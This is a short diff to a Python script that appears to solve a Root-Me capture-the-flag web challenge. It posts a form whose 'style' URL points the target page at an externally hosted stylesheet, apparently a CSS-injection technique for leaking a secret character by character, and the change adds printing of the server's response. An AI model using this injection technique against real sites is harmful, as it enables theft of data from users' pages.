@@ -95,6 +95,7 @@ while 1:
         # request POST
         # TODO: request post for aff in request bin car get et curl ne fonctionne pas
         data = {"name":"coutcout", "email":"a@gmail.com","url":"http://challenge01.root-me.org:58005/?style=//kixisaleesd.github.io/test/a", "description":"e"}
-        requests.post("http://challenge01.root-me.org:58005/?style=light", data=data)
+        r = requests.post("http://challenge01.root-me.org:58005/?style=light", data=data)
+        print(r.content)
 
     know += input("new chars to know : ")
